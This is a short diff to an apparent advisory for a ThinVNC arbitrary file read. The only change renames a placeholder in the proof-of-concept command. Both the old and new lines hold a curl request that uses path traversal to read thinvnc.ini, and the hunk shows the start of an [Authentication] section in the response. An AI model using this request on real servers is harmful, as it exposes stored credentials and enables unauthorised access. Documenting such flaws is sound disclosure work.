@@ -7,7 +7,7 @@ ThinVNC - Arbitrary File Read.
 	  
 - POC:
 ```
-curl -k -X 'GET' "http://victim_ip_address:port/a/\../\../thinvnc.ini"
+curl -k -X 'GET' "http://target_ip_address:port/a/\../\../thinvnc.ini"
 	  
 Response:
 [Authentication]
